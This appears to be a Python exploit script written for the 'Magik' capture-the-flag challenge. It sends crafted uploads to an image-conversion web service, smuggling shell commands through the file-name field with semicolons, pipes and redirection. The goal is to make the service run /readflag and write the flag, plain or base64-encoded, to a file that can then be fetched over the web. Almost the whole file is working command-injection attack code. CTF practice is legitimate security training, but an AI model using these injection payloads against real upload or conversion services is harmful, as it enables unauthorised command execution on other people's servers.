#!/usr/bin/env python3
"""
Magik - EXIF embedding approach
The convert.sh runs exiftool AFTER convert. Maybe we can exploit that.
"""

import requests
import base64
import time

URL = "https://aa1fadfd635d-magik.challs.m0lecon.it/"
png = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==')

print("[*] New approach: Check if ImageMagick's -label or -comment works WITHOUT colon")
print()

# ImageMagick can add text to images with -label or -comment
# These don't require the label: protocol

print("[TEST 1] Try using -label to embed text in the output image")
# The injection: x.png -label "TESTLABEL" output
# Full command: convert /tmp/... ... static/x.png -label "TESTLABEL" output.png
r = requests.post(URL,
    files={'img': ('test.png', png)},
    data={'name': 'x.png -label TESTLABEL output'},
    timeout=10)
print(f"  Upload: {r.status_code}")
time.sleep(2)

# Try to access output.png
r2 = requests.get(f"{URL}static/output.png", timeout=3)
print(f"  Fetch static/output.png: {r2.status_code}")
if r2.status_code == 200:
    # Check if it's an image
    print(f"    Size: {len(r2.content)} bytes")
    print(f"    First bytes: {r2.content[:50]}")

print("\n" + "="*60 + "\n")

# Wait, I just realized something crucial!
# Looking back at the command: convert $1 ... $2
# where $2 = static/x.png |/readflag>output /app/test.png
#
# The issue is that in my previous tests, ALL files returned index.php (2584 bytes)
# This means the PHP router is intercepting everything
#
# But what if the files DO exist and I need to access them differently?

print("[TEST 2] Try creating a .png file with known name")
r = requests.post(URL,
    files={'img': ('test.png', png)},
    data={'name': 'mytest'},
    timeout=10)
print(f"  Upload (should create static/mytest.png): {r.status_code}")
time.sleep(2)

# Try to access it
r2 = requests.get(f"{URL}static/mytest.png", timeout=3)
print(f"  Fetch static/mytest.png: {r2.status_code} ({len(r2.content)} bytes)")
if r2.status_code == 200 and r2.content[:4] == b'\x89PNG':
    print("    âœ“ It's a PNG! So normal convert output IS accessible!")
elif r2.status_code == 200:
    print(f"    Content preview: {r2.content[:100]}")

print("\n" + "="*60 + "\n")

# If normal PNG files ARE accessible, then the issue is my injection is breaking convert
# Let me verify the actual semicolon injection works

print("[TEST 3] Semicolon injection to write actual flag")
# This should execute: convert /tmp/... ... static/x.png ; /readflag > static/GETFLAG ; /app/dummy.png
# Wait, that's wrong. Let me think about the actual command parsing...
#
# $2 = static/x.png;/readflag>GETFLAG;y.png
# Command: convert /tmp/... static/x.png ; /readflag > GETFLAG ; y.png
# This means:
#   1. convert /tmp/... static/x.png (succeeds)
#   2. /readflag > GETFLAG (redirects to current dir)
#   3. y.png (command not found, but who cares)

r = requests.post(URL,
    files={'img': ('test.png', png)},
    data={'name': 'semicolon.png;/readflag;echo AFTER'},
    timeout=10)
print(f"  Upload: {r.status_code}")
time.sleep(2)

# The flag should be written to STDOUT
# But we can't see that. Let me redirect it...

print("\n" + "="*60 + "\n")

print("[TEST 4] Redirect flag to accessible location")
# Key insight: If static/test.png IS accessible, then I can write flag THERE
# But /readflag outputs text, not a PNG...
#
# WAIT! What if I use convert to create an image FROM the flag text?
# No wait, that needs label: which requires colon.
#
# Let me just try writing the flag to a file in static/

r = requests.post(URL,
    files={'img': ('test.png', png)},
    data={'name': 'x;/readflag>THEFLAG.txt;y'},
    timeout=10)
print(f"  Upload (execute /readflag > THEFLAG.txt): {r.status_code}")
time.sleep(2)

# Try to access from root
for path in ['THEFLAG.txt', 'static/THEFLAG.txt']:
    try:
        r2 = requests.get(f"{URL}{path}", timeout=3)
        print(f"  GET /{path}: {r2.status_code} ({len(r2.content)} bytes)")
        if r2.status_code == 200:
            if 'ptm{' in r2.text or 'flag' in r2.text.lower():
                print(f"\n*** POTENTIAL FLAG: {r2.text} ***\n")
            elif len(r2.content) < 200:
                print(f"    Content: {r2.text}")
    except Exception as e:
        print(f"  GET /{path}: Error - {e}")

print("\n" + "="*60 + "\n")
print("[TEST 5] Use base64 to make flag ASCII-safe")
r = requests.post(URL,
    files={'img': ('test.png', png)},
    data={'name': 'x;/readflag|base64>FLAG_B64.txt;y'},
    timeout=10)
print(f"  Upload: {r.status_code}")
time.sleep(2)

try:
    r2 = requests.get(f"{URL}FLAG_B64.txt", timeout=3)
    print(f"  GET /FLAG_B64.txt: {r2.status_code}")
    if r2.status_code == 200 and 'ptm' not in r2.text:
        import base64
        try:
            decoded = base64.b64decode(r2.text.strip())
            print(f"\n*** DECODED FLAG: {decoded.decode()} ***\n")
        except:
            print(f"    Content: {r2.text[:200]}")
except Exception as e:
    print(f"  Error: {e}")
